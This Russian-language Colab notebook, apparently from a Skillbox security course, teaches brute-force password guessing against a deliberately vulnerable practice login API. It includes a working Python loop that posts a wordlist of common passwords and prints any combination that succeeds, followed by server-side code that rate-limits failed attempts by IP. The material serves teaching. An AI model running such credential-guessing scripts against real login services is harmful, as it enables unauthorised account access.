{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "collapsed_sections": [],
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/TinaiZ/intensive20210424/blob/master/Skillbox_Brute_Force.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "f5cf_R24cTOu",
        "outputId": "d068ddf1-690c-4424-e7f3-85ce63501bf8"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Python прямо работает!\n"
          ]
        }
      ],
      "source": [
        "print(\"Python прямо работает!\")"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# http://vulnerable-app-1.mooo.com/api/login-with-password\n",
        "# login: 2312312\n",
        "# password: иьаьаьа"
      ],
      "metadata": {
        "id": "8VLA0TIVdvke"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# HTTP POST запрос\n",
        "import requests\n",
        "\n",
        "URL = \"http://vulnerable-app-1.mooo.com/api/login-with-password\"\n",
        "data = { \"login\": \"skillbox\", \"password\": \"1234\" }\n",
        "\n",
        "result = requests.post(URL, data)"
      ],
      "metadata": {
        "id": "GNjOxK9aeB-C"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# HTTP Status Code\n",
        "# 2** - все ок\n",
        "# 3** - перенаправление\n",
        "# 4** - ошибка запроса/клиента (пользователя)\n",
        "# 5** - ошибка сервера\n",
        "result.status_code"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Cm_F7rtVfFtF",
        "outputId": "cbada182-a159-4f61-cd30-6926937fa357"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "200"
            ]
          },
          "metadata": {},
          "execution_count": 5
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# Узнать параметр Content-Type (тип содержимого)\n",
        "result.headers[\"Content-Type\"]"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 35
        },
        "id": "9kV7ir9DfKY7",
        "outputId": "492f9cee-dc7c-426c-b120-a9fa7878c9ea"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "'application/json'"
            ],
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "string"
            }
          },
          "metadata": {},
          "execution_count": 6
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# application/json - данные в формате JSON\n",
        "result.json()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "pwp_sa1rfzHM",
        "outputId": "77ce99b0-fce3-4890-9303-db62cfe8d6d7"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "{'result': False}"
            ]
          },
          "metadata": {},
          "execution_count": 7
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# Brute Force = Метод Грубой Силы, прямой перебор пароля\n",
        "# 4 символа, только буквы (a-z) => 26 ^ 4\n",
        "print(26**4)\n",
        "# 4 символа, только буквы (a-zA-Z0-9) => 62 ^ 4\n",
        "print(62*62*62*62)\n",
        "# 8 символов, (a-zA-Z0-9!\"№;%:?*()<>-+\") => 100 ^ 8\n",
        "print(100**8)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Ae7SYDRJgEi9",
        "outputId": "aeeba5c7-e9e1-4ba2-a588-1b59afb631cc"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "456976\n",
            "14776336\n",
            "10000000000000000\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "password_list = [\n",
        "    \"qwerty\",\n",
        "    \"password1234\",\n",
        "    \"zxcvbnm\",\n",
        "    \"mike\",\n",
        "    \"skill\",\n",
        "    \"box\",\n",
        "    \"skillbox\",\n",
        "    \"2022\",\n",
        "    \"python\",\n",
        "    \"pwd1234567890\",\n",
        "    \"987654321\",\n",
        "]\n",
        "\n",
        "URL = \"http://vulnerable-app-1.mooo.com/api/login-with-password\"\n",
        "\n",
        "# Cделать действие над каждым элементом списка\n",
        "# Для каждого password (переменная) в списке password_list\n",
        "for password in password_list:\n",
        "    data = { \"login\": \"skillbox\", \"password\": password }\n",
        "    result = requests.post(URL, data)  # Отправляем запрос, кладем ответ в result\n",
        "    if result.status_code != 200:  # 200 = OK, а если не 200 - то проблема\n",
        "        print(\"ERROR! Status code: \", result.status_code)  #  Выводим сообщение об ошибке\n",
        "    json = result.json()  # Получаем данные из ответа сервера\n",
        "    auth_result = json[\"result\"]  # True - логин/пароль подошли, False: не подошли\n",
        "    print(\"Success: \", auth_result)\n",
        "    if auth_result:\n",
        "        print(data)"
      ],
      "metadata": {
        "id": "bFIGIDJBgvu6"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "Код с сервера:\n",
        "```python\n",
        "from flask import request\n",
        "\n",
        "MAX_ATTEMPTS = 10\n",
        "IP_LIST = {}\n",
        "# {\"1.2.3.4\" : 10, \"9.8.7.6\" => 2}\n",
        "\n",
        "# Вызывается когда кто-то присылает неверный логин и пароль\n",
        "def failed_attempt():\n",
        "    # Сколько раз с данного IP?\n",
        "    ip = request.remote_addr\n",
        "    if ip not in IP_LIST:  # Если IP адреса нет в списке\n",
        "        IP_LIST[ip] = 0    # Запишем что с него было 0 неудачных попыток\n",
        "    IP_LIST[ip] += 1       # Увеличим значение на 1\n",
        "\n",
        "# Вызывается когда надо узнать забанен ли человек или нет\n",
        "# Забанен? => True / False\n",
        "def is_banned():\n",
        "    ip = request.remote_addr  # IP подключившегося\n",
        "    if ip not in IP_LIST:\n",
        "        return False  # Нет в списке - не забнен\n",
        "    return IP_LIST[ip] > MAX_ATTEMPTS  # Забанен, если кол-во больше 10\n",
        "```"
      ],
      "metadata": {
        "id": "VEjxYyL_s9--"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# XSS, CSRF"
      ],
      "metadata": {
        "id": "JOM63r7cmbCf"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}